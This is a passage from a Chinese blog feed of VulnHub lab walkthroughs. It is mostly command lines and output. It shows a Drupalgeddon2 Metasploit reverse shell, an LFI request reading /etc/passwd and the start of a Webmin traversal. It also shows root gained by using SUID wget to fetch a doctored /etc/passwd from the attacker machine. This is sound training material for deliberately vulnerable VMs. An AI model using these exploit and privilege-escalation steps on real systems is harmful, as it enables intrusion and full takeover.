<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo &quot;KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==&quot;  | base64 -d</span></span><br><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ ++.-- ----- --.&lt;+ ++[-&gt; +++&lt;] &gt;+++.</span><br><span class="line">----- ---.&lt; +++[- &gt;+++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- ----- -&lt;]&gt;- ----- --.&lt;+</span><br><span class="line">++[-&gt; +++&lt;] &gt;++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;. ++.++ +++++ +.--- ---.&lt; +++[-</span><br><span class="line">&gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ [-&gt;-- ----- &lt;]&gt;-. &lt;+++[ -&gt;--- &lt;]&gt;-- -.+.- ---.+</span><br><span class="line">++.&lt;</span><br></pre></td></tr></table></figure>

<p>可以看出是brain-fuck加密的字符串，到<span class="exturl" data-url="aHR0cHM6Ly93d3cuc3BsaXRicmFpbi5vcmcvc2VydmljZXMvb29r">Brainfuck/Ook! Obfuscation/Encoding<i class="fa fa-external-link-alt"></i></span>解密。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub83.jpg"></p>
<p>得到账号密码：james/Hacker@4514，登录。</p>
<h3 id="getshell得到第一个flag"><a href="#getshell得到第一个flag" class="headerlink" title="getshell得到第一个flag"></a>getshell得到第一个flag</h3><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub84.jpg"></p>
<p>发现是 7.57 版本，存在drupalgeddon2远程代码执行</p>
<p>使用msf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"><span class="comment"># cowsay++                                                                                                                                                                                                                                 </span></span><br><span class="line"> ____________                                                                                                                                                                                                                              </span><br><span class="line">&lt; metasploit &gt;                                                                                                                                                                                                                             </span><br><span class="line"> ------------                                                                                                                                                                                                                              </span><br><span class="line">       \   ,__,                                                                                                                                                                                                                            </span><br><span class="line">        \  (oo)____                                                                                                                                                                                                                        </span><br><span class="line">           (__)    )\                                                                                                                                                                                                                      </span><br><span class="line">              ||--|| *                                                                                                                                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">       =[ metasploit v5.0.64-dev                          ]                                                                                                                                                                                </span><br><span class="line">+ -- --=[ 1952 exploits - 1089 auxiliary - 335 post       ]                                                                                                                                                                                </span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]                                                                                                                                                                                </span><br><span class="line">+ -- --=[ 7 evasion                                       ]                                                                                                                                                                                </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">msf5 &gt; search Drupalgeddon2                                                                                                                                                                                                                </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Matching Modules                                                                                                                                                                                                                           </span><br><span class="line">================                                                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank       Check  Description                                                                                                                                             </span></span><br><span class="line">   -  ----                                      ---------------  ----       -----  -----------                                                                                                                                             </span><br><span class="line">   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection                                                                                                      </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2                                                                                                                                                                                        </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> rhost 192.168.56.103</span><br><span class="line">rhost =&gt; 192.168.56.103</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> targeturi /drupal</span><br><span class="line">targeturi =&gt; /drupal</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.102:4444 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.56.103</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.56.102:4444 -&gt; 192.168.56.103:58828) at 2019-12-22 22:08:44 -0500</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/html/drupal</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100777/rwxrwxrwx  317     fil   2018-02-21 12:28:43 -0500  .editorconfig</span><br><span class="line">100777/rwxrwxrwx  174     fil   2018-02-21 12:28:43 -0500  .gitignore</span><br><span class="line">100777/rwxrwxrwx  6112    fil   2018-02-21 12:28:43 -0500  .htaccess</span><br><span class="line">100777/rwxrwxrwx  111736  fil   2018-02-21 12:28:43 -0500  CHANGELOG.txt</span><br><span class="line">100777/rwxrwxrwx  1481    fil   2018-02-21 12:28:43 -0500  COPYRIGHT.txt</span><br><span class="line">100777/rwxrwxrwx  1717    fil   2018-02-21 12:28:43 -0500  INSTALL.mysql.txt</span><br><span class="line">100777/rwxrwxrwx  1874    fil   2018-02-21 12:28:43 -0500  INSTALL.pgsql.txt</span><br><span class="line">100777/rwxrwxrwx  1298    fil   2018-02-21 12:28:43 -0500  INSTALL.sqlite.txt</span><br><span class="line">100777/rwxrwxrwx  17995   fil   2018-02-21 12:28:43 -0500  INSTALL.txt</span><br><span class="line">100777/rwxrwxrwx  18092   fil   2016-11-16 18:57:05 -0500  LICENSE.txt</span><br><span class="line">100777/rwxrwxrwx  8710    fil   2018-02-21 12:28:43 -0500  MAINTAINERS.txt</span><br><span class="line">100777/rwxrwxrwx  5382    fil   2018-02-21 12:28:43 -0500  README.txt</span><br><span class="line">100777/rwxrwxrwx  10123   fil   2018-02-21 12:28:43 -0500  UPGRADE.txt</span><br><span class="line">100777/rwxrwxrwx  6604    fil   2018-02-21 12:28:43 -0500  authorize.php</span><br><span class="line">100777/rwxrwxrwx  720     fil   2018-02-21 12:28:43 -0500  cron.php</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  includes</span><br><span class="line">100777/rwxrwxrwx  529     fil   2018-02-21 12:28:43 -0500  index.php</span><br><span class="line">100777/rwxrwxrwx  703     fil   2018-02-21 12:28:43 -0500  install.php</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  misc</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  modules</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  profiles</span><br><span class="line">100777/rwxrwxrwx  2189    fil   2018-02-21 12:28:43 -0500  robots.txt</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  scripts</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  sites</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  themes</span><br><span class="line">100777/rwxrwxrwx  19986   fil   2018-02-21 12:28:43 -0500  update.php</span><br><span class="line">100777/rwxrwxrwx  2200    fil   2018-02-21 12:28:43 -0500  web.config</span><br><span class="line">100777/rwxrwxrwx  417     fil   2018-02-21 12:28:43 -0500  xmlrpc.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">/var/www/html/drupal</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2203 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@hackNos:/var/www/html/drupal$ ls</span><br><span class="line">ls</span><br><span class="line">CHANGELOG.txt       INSTALL.txt      authorize.php  misc        sites</span><br><span class="line">COPYRIGHT.txt       LICENSE.txt      cron.php       modules     themes</span><br><span class="line">INSTALL.mysql.txt   MAINTAINERS.txt  includes       profiles    update.php</span><br><span class="line">INSTALL.pgsql.txt   README.txt       index.php      robots.txt  web.config</span><br><span class="line">INSTALL.sqlite.txt  UPGRADE.txt      install.php    scripts     xmlrpc.php</span><br><span class="line">www-data@hackNos:/var/www/html/drupal$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@hackNos:/var/www/html/drupal$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@hackNos:/var/www/html/drupal$</span><br></pre></td></tr></table></figure>

<p>找到第一个flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hackNos:/var/www/html/drupal$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">www-data@hackNos:/home$ ls</span><br><span class="line">ls</span><br><span class="line">james</span><br><span class="line">www-data@hackNos:/home$ <span class="built_in">cd</span> james</span><br><span class="line"><span class="built_in">cd</span> james</span><br><span class="line">www-data@hackNos:/home/james$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">www-data@hackNos:/home/james$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">   _                                  </span><br><span class="line">  | |                                 </span><br><span class="line"> / __) ______  _   _  ___   ___  _ __ </span><br><span class="line"> \__ \|______|| | | |/ __| / _ \| <span class="string">&#x27;__|</span></span><br><span class="line"><span class="string"> (   /        | |_| |\__ \|  __/| |   </span></span><br><span class="line"><span class="string">  |_|          \__,_||___/ \___||_|   </span></span><br><span class="line"><span class="string">                                      </span></span><br><span class="line"><span class="string">                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span></span><br><span class="line"><span class="string">www-data@hackNos:/home/james$</span></span><br></pre></td></tr></table></figure>

<h3 id="提权，找到第二个flag"><a href="#提权，找到第二个flag" class="headerlink" title="提权，找到第二个flag"></a>提权，找到第二个flag</h3><p>使用SUID检查文件查找命令，看到输出/usr/bin/wget 有SUID权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hackNos:/home/james$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/i386-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/wget</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/fusermount</span><br></pre></td></tr></table></figure>

<p>进入/etc/passwd并将此文件复制到本地系统，并使用openSSL生成新密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># openssl passwd -1 -salt lucifer11 passwd                                                                                    </span></span><br><span class="line"><span class="variable">$1</span><span class="variable">$lucifer1</span><span class="variable">$TOAYpZO4bCfctvslb57pP</span>.</span><br></pre></td></tr></table></figure>

<p>将生成的hash值放入passwd中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucifer11:<span class="variable">$1</span><span class="variable">$lucifer1</span><span class="variable">$TOAYpZO4bCfctvslb57pP</span>.:0:0:,,,/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub85.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>在shell中下载并替换passwd文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hackNos:/etc$ wget http://192.168.56.102:8000/passwd -O passwd</span><br><span class="line">wget http://192.168.56.102:8000/passwd -O passwd</span><br><span class="line">--2019-12-23 09:00:24--  http://192.168.56.102:8000/passwd</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1687 (1.6K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;passwd&#x27;</span></span><br><span class="line"></span><br><span class="line">passwd              100%[===================&gt;]   1.65K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2019-12-23 09:00:24 (405 MB/s) - <span class="string">&#x27;passwd&#x27;</span> saved [1687/1687]</span><br></pre></td></tr></table></figure>

<p>成功下载并替换,然后登录root用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hackNos:/etc$ su lucifer11</span><br><span class="line">su lucifer11</span><br><span class="line">Password: passwd</span><br><span class="line"></span><br><span class="line">bash: /bin/bash/.bashrc: Not a directory</span><br><span class="line">root@hackNos:/etc<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@hackNos:/etc<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>找到flag,帅掉渣</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@hackNos:/etc<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@hackNos:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@hackNos:/root<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">    _  _                              _   </span><br><span class="line">  _| || |_                           | |  </span><br><span class="line"> |_  __  _|______  _ __  ___    ___  | |_ </span><br><span class="line">  _| || |_|______|| <span class="string">&#x27;__|/ _ \  / _ \ | __|</span></span><br><span class="line"><span class="string"> |_  __  _|       | |  | (_) || (_) || |_ </span></span><br><span class="line"><span class="string">   |_||_|         |_|   \___/  \___/  \__|</span></span><br><span class="line"><span class="string">                                          </span></span><br><span class="line"><span class="string">                                          </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author : Rahul Gehlaut</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Linkedin : https://www.linkedin.com/in/rahulgehlaut/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Blog : www.hackNos.com</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub86.jpg"></p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[pWnOS-1.0]</title>
    <url>/2019/12/29/pWnOS-1/</url>
    <content><![CDATA[<h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>名称：pWnOS：1.0<br>发布日期：2008年6月27日</p>
<h3 id="Readme-txt"><a href="#Readme-txt" class="headerlink" title="Readme.txt"></a>Readme.txt</h3><p>感谢您尝试使用pWnOS 1.0。开始之前需要注意的几件事。 pWnOS是使用VMware Workstation制作的，可以通过下载VMware Server或Vmware Player来启动…两者都是免费的！或免费的VMware Workstation（Windows）或VMware Fusion（OS X）。</p>
<p>1.如果Vmware在首次引导时询问您是复制还是移动了该虚拟机，请单击MOVED！否则，网络设置可能会混乱。<br>2.当前已将虚拟机设置为使用桥接网络，但是您可能希望根据自己的喜好将其更改为NAT或“仅主机”。<br>3.可以在milw0rm.com上找到所有必需的工具/漏洞/所有内容。<br>4.有多种途径可以访问外壳。我创建了一个n00b路径和一个更高级的路径。看看是否可以同时获得它们！<br>我将pWnOS的难度评定为与De-Ice的2级磁盘大致相同…可能要困难一些。有关De-Ice渗透测试磁盘的信息，请参见<span class="exturl" data-url="aHR0cDovL3d3dy5kZS1pY2UubmV0Li8=">http://www.de-ice.net。<i class="fa fa-external-link-alt"></i></span><br>我希望你喜欢它！如果您有任何疑问或反馈，请给我发送电子邮件至<span class="exturl" data-url="bWFpbHRvOiYjOTg7JiN4NmY7JiMxMTA7JiMxMDA7JiM0ODsmI3gzMDsmI3g0MDsmIzEwMzsmI3g2ZDsmI3g2MTsmI3g2OTsmIzEwODsmIzQ2OyYjeDYzOyYjeDZmOyYjMTA5Ow==">&#98;&#x6f;&#110;&#100;&#48;&#x30;&#x40;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;<i class="fa fa-external-link-alt"></i></span><br>bond00</p>
<a id="more"></a>

<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3B3bm9zLmNvbS9maWxlcy9wV25PU192MS4wLnppcA==">http://pwnos.com/files/pWnOS_v1.0.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9wd25vcy9wV25PU192MS4wLnppcA==">https://download.vulnhub.com/pwnos/pWnOS_v1.0.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9wd25vcy9wV25PU192MS4wLnppcC50b3JyZW50">https://download.vulnhub.com/pwnos/pWnOS_v1.0.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>你们中有些人可能已经注意到了这个新的pWnOS论坛部分。 我创建了pWnOS作为虚拟机，而Grendel很好，我可以在这里发布它。 这是有关pWnOS的一些信息。<br>这是一个有意配置有可利用服务的linux虚拟机，可为您提供通往r00t的路径。 :)当前，虚拟机NIC是在桥接网络中配置的，因此它将在您连接到的网络上获得一个正常的IP地址。 您可以根据需要轻松地将其更改为NAT或仅主机。 快速ping扫描将显示虚拟机的IP地址。<br>对不起…没有任何场景/故事情节。 我并不是真的打算这样发布它，所以也许对于2.0版，我会更具创造力。 :)我很想得到反馈，所以请告诉我它的进展或您有任何疑问。 谢谢，祝你好运！<br>资料来源：<span class="exturl" data-url="aHR0cDovL2ZvcnVtcy5oYWNraW5nZG9qby5jb20vdmlld3RvcGljLnBocD9mPTIxJmFtcDt0PTE0OQ==">http://forums.hackingdojo.com/viewtopic.php?f=21&amp;t=149<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.33.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (192.168.33.3)</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 00:0C:29:5E:18:C9 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sT -Pn -n -vv 192.168.33.3 -p- -sC --script=vuln</span></span><br><span class="line">PORT      STATE SERVICE          REASON</span><br><span class="line">22/tcp    open  ssh              syn-ack</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp    open  http             syn-ack</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /icons/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6&#x27;</span></span><br><span class="line">|   /index/: Potentially interesting folder</span><br><span class="line">|_  /php/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6&#x27;</span></span><br><span class="line">|_http-jsonp-detection: Couldn<span class="string">&#x27;t find any JSONP endpoints.</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| http-trace: TRACE is enabled</span></span><br><span class="line"><span class="string">| Headers:</span></span><br><span class="line"><span class="string">| Date: Sun, 29 Dec 2019 08:21:03 GMT</span></span><br><span class="line"><span class="string">| Server: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6</span></span><br><span class="line"><span class="string">| Connection: close</span></span><br><span class="line"><span class="string">| Transfer-Encoding: chunked</span></span><br><span class="line"><span class="string">|_Content-Type: message/http</span></span><br><span class="line"><span class="string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#x27;</span>t find wp-login.php</span><br><span class="line">139/tcp   open  netbios-ssn      syn-ack</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">445/tcp   open  microsoft-ds     syn-ack</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">10000/tcp open  snet-sensor-mgmt syn-ack</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-vuln-cve2006-3392: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Webmin File Disclosure</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  CVE:CVE-2006-3392</span><br><span class="line">|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path <span class="keyword">function</span> before decoding HTML.</span><br><span class="line">|       This allows arbitrary files to be <span class="built_in">read</span>, without requiring authentication, using <span class="string">&quot;..%01&quot;</span> sequences</span><br><span class="line">|       to bypass the removal of <span class="string">&quot;../&quot;</span> directory traversal sequences.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2006-06-29</span><br><span class="line">|     References:</span><br><span class="line">|       http://www.exploit-db.com/exploits/1997/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392</span><br><span class="line">|_      http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">|_smb-vuln-ms10-061: <span class="literal">false</span></span><br><span class="line">|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>上dirb</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.33.3/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Dec 31 02:00:48 2019</span><br><span class="line">URL_BASE: http://192.168.33.3/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.33.3/ ----</span><br><span class="line">+ http://192.168.33.3/cgi-bin/ (CODE:403|SIZE:306)                                                    </span><br><span class="line">+ http://192.168.33.3/index (CODE:200|SIZE:295)                                                       </span><br><span class="line">+ http://192.168.33.3/index.php (CODE:200|SIZE:295)                                                   </span><br><span class="line">+ http://192.168.33.3/index1 (CODE:200|SIZE:1104)                                                     </span><br><span class="line">+ http://192.168.33.3/index2 (CODE:200|SIZE:156)                                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.33.3/php/</span><br></pre></td></tr></table></figure>

<p>/php目录有一个phpmyadmin，但是需要密码，除此之外没有太多可用的信息。</p>
<p>构造如下poc，观察返回结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.33.3/index1.php?<span class="built_in">help</span>=<span class="literal">true</span>&amp;connect=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub119.jpg"></p>
<p>说明存在本地文件包含漏洞LFI</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh dhcp:x:100:101::/nonexistent:/bin/<span class="literal">false</span> syslog:x:101:102::/home/syslog:/bin/<span class="literal">false</span> klog:x:102:103::/home/klog:/bin/<span class="literal">false</span> mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/<span class="literal">false</span> sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash obama:x:1001:1001::/home/obama:/bin/bash osama:x:1002:1002::/home/osama:/bin/bash yomama:x:1003:1003::/home/yomama:/bin/bash </span><br></pre></td></tr></table></figure>

<h3 id="转向10000端口的webmin"><a href="#转向10000端口的webmin" class="headerlink" title="转向10000端口的webmin"></a>转向10000端口的webmin</h3><p>本来可以使用<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMjAxNw==">webminperl脚本<i class="fa fa-external-link-alt"></i></span>，但是现在尝试下手工构造poc。。。<br>注意使..%01/..%01/..%01/..%01/..%01/..%01/尽量长一些。。。</p>
